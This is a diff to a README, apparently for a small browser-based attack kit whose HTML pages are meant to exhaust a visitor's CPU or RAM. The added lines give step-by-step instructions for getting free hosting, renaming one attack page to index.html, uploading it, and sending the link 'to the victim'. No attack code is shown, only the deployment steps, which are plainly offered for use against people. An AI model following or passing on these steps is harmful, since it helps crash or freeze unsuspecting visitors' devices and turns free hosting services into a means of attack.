@@ -16,4 +16,9 @@ The second file is called (Kill_RAM__HIDE.html). When the user enters this page,
 
 # Run On Host And Get Link
 
-1~ 
+1~ First, you need to get a host (you can get free hosting from 000webhost.com and replit.com)
+
+2~ One of the available files is Kill_CPU__SHOW.html or
+Download Kill_RAM__HIDE.html (my suggestion is Kill_CPU__SHOW.html) and change the file name to index.html and then upload it to your host.
+
+3~ Now give your website address to the victim and that's it!
